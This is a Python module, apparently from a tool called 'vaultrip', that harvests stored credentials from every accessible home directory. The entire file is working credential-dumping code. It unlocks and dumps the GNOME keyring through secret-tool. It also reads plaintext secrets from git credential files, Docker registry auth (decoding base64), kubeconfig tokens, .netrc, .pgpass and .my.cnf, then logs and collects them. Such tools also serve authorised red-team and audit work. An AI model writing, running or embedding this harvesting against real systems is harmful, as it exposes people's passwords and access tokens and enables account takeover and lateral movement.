# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
System credential stores: GNOME keyring, git credentials, Docker, Kubernetes secrets.

Uses subprocess to call secret-tool (libsecret), git credential, and reads
JSON config files for Docker/k8s without third-party Python dependencies.
"""

from __future__ import annotations

import json
import logging
import os
import subprocess

from ..reporter import ScanResult, SystemCredFinding
from .passive import PassiveInfo

log = logging.getLogger("vaultrip.system")


def run(result: ScanResult, passive: PassiveInfo) -> None:
    """Harvest credentials from system stores for all accessible home dirs."""
    for home in passive.home_dirs:
        _gnome_keyring(result, home)
        _git_credentials(result, home)
        _docker_credentials(result, home)
        _kubernetes_secrets(result, home)
        _netrc(result, home)
        _pgpass(result, home)
        _mysql_cnf(result, home)


# ---------------------------------------------------------------------------
# GNOME keyring / libsecret
# ---------------------------------------------------------------------------

def _gnome_keyring(result: ScanResult, home: str) -> None:
    if not _command_exists("secret-tool"):
        return
    try:
        proc = subprocess.run(
            ["secret-tool", "search", "--all", "--unlock", "xdg:schema", ""],
            capture_output=True, text=True, timeout=10,
            env={**os.environ, "HOME": home},
        )
        _parse_secret_tool_output(result, proc.stdout)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass


def _parse_secret_tool_output(result: ScanResult, output: str) -> None:
    """Parse multi-line secret-tool output into SystemCredFinding entries."""
    current: dict = {}
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("["):
            if current:
                result.append_system(SystemCredFinding(
                    store="gnome-keyring",
                    label=current.get("label", ""),
                    username=current.get("username") or current.get("account"),
                    secret=current.get("secret"),
                ))
                log.info("system: gnome-keyring item: %s", current.get("label", ""))
            current = {}
        elif "=" in line:
            key, _, value = line.partition("=")
            current[key.strip().lower()] = value.strip()
        elif line.startswith("secret = "):
            current["secret"] = line[len("secret = "):]
    if current:
        result.append_system(SystemCredFinding(
            store="gnome-keyring",
            label=current.get("label", ""),
            username=current.get("username") or current.get("account"),
            secret=current.get("secret"),
        ))


# ---------------------------------------------------------------------------
# Git credential store
# ---------------------------------------------------------------------------

def _git_credentials(result: ScanResult, home: str) -> None:
    for cred_file in [
        os.path.join(home, ".git-credentials"),
        os.path.join(home, ".config", "git", "credentials"),
    ]:
        if not os.path.isfile(cred_file):
            continue
        try:
            with open(cred_file) as fh:
                for line in fh:
                    line = line.strip()
                    if not line or not line.startswith(("http://", "https://")):
                        continue
                    # Format: https://user:pass@host
                    _parse_credential_url(result, "git", line)
        except OSError:
            pass


def _parse_credential_url(result: ScanResult, store: str, url: str) -> None:
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        if parsed.username or parsed.password:
            result.append_system(SystemCredFinding(
                store=store,
                label=parsed.hostname or url,
                username=parsed.username,
                secret=parsed.password,
            ))
            log.info("system: %s credential for %s", store, parsed.hostname)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Docker credentials
# ---------------------------------------------------------------------------

def _docker_credentials(result: ScanResult, home: str) -> None:
    config_path = os.path.join(home, ".docker", "config.json")
    if not os.path.isfile(config_path):
        return
    try:
        with open(config_path) as fh:
            config = json.load(fh)
    except (OSError, json.JSONDecodeError):
        return

    auths = config.get("auths", {})
    for registry, auth_data in auths.items():
        auth_b64 = auth_data.get("auth", "")
        username, _, password = None, None, None
        if auth_b64:
            try:
                import base64
                decoded = base64.b64decode(auth_b64).decode("utf-8", errors="replace")
                username, _, password = decoded.partition(":")
            except Exception:
                pass
        result.append_system(SystemCredFinding(
            store="docker",
            label=registry,
            username=username or auth_data.get("username"),
            secret=password or None,
        ))
        log.info("system: docker registry credential: %s", registry)


# ---------------------------------------------------------------------------
# Kubernetes secrets (local kubeconfig)
# ---------------------------------------------------------------------------

def _kubernetes_secrets(result: ScanResult, home: str) -> None:
    kube_config = os.path.join(home, ".kube", "config")
    if not os.path.isfile(kube_config):
        return
    try:
        import yaml  # pyyaml — optional
    except ImportError:
        _kubernetes_secrets_grep(result, kube_config)
        return
    try:
        with open(kube_config) as fh:
            config = yaml.safe_load(fh)
        for user_entry in config.get("users", []):
            name = user_entry.get("name", "")
            user = user_entry.get("user", {})
            token    = user.get("token")
            password = user.get("password")
            username = user.get("username")
            if token or password:
                result.append_system(SystemCredFinding(
                    store="kubernetes",
                    label=name,
                    username=username,
                    secret=token or password,
                ))
                log.info("system: kubernetes credential for user: %s", name)
    except Exception as exc:
        log.debug("system: k8s config parse error: %s", exc)


def _kubernetes_secrets_grep(result: ScanResult, kube_config: str) -> None:
    """Fallback: extract token/password lines from kubeconfig without yaml."""
    try:
        with open(kube_config) as fh:
            for line in fh:
                line = line.strip()
                for key in ("token:", "password:"):
                    if line.startswith(key):
                        value = line[len(key):].strip()
                        if value:
                            result.append_system(SystemCredFinding(
                                store="kubernetes",
                                label="kubeconfig",
                                secret=value,
                            ))
    except OSError:
        pass


# ---------------------------------------------------------------------------
# .netrc
# ---------------------------------------------------------------------------

def _netrc(result: ScanResult, home: str) -> None:
    netrc_path = os.path.join(home, ".netrc")
    if not os.path.isfile(netrc_path):
        return
    try:
        import netrc as netrc_mod
        nrc = netrc_mod.netrc(netrc_path)
        for host, (login, account, password) in nrc.hosts.items():
            result.append_system(SystemCredFinding(
                store="netrc",
                label=host,
                username=login,
                secret=password,
            ))
            log.info("system: .netrc entry for %s", host)
    except Exception as exc:
        log.debug("system: netrc parse error: %s", exc)


# ---------------------------------------------------------------------------
# PostgreSQL .pgpass
# ---------------------------------------------------------------------------

def _pgpass(result: ScanResult, home: str) -> None:
    pgpass_path = os.path.join(home, ".pgpass")
    if not os.path.isfile(pgpass_path):
        return
    try:
        with open(pgpass_path) as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) >= 5:
                    host, port, db, user, password = parts[0], parts[1], parts[2], parts[3], ":".join(parts[4:])
                    result.append_system(SystemCredFinding(
                        store="postgresql",
                        label=f"{host}:{port}/{db}",
                        username=user,
                        secret=password,
                    ))
                    log.info("system: .pgpass entry for %s@%s", user, host)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# MySQL .my.cnf
# ---------------------------------------------------------------------------

def _mysql_cnf(result: ScanResult, home: str) -> None:
    cnf_path = os.path.join(home, ".my.cnf")
    if not os.path.isfile(cnf_path):
        return
    try:
        import configparser
        cfg = configparser.ConfigParser()
        cfg.read(cnf_path)
        for section in cfg.sections():
            password = cfg.get(section, "password", fallback=None)
            user     = cfg.get(section, "user", fallback=None)
            if password:
                result.append_system(SystemCredFinding(
                    store="mysql",
                    label=section,
                    username=user,
                    secret=password,
                ))
                log.info("system: .my.cnf [%s] has password", section)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def _command_exists(cmd: str) -> bool:
    import shutil
    return shutil.which(cmd) is not None
